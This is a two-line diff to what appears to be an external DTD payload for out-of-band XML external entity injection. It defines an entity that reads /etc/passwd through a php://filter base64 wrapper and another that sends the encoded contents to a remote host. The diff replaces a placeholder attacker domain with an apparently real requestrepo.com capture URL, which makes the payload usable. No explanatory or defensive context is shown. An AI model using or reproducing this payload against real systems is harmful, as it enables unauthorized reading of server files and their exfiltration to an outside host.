@@ -1,2 +1,2 @@
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd">
-<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker-server.com/exfil/?data=%file;'>">
+<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'https://knuifzag.requestrepo.com/?data=%file;'>">
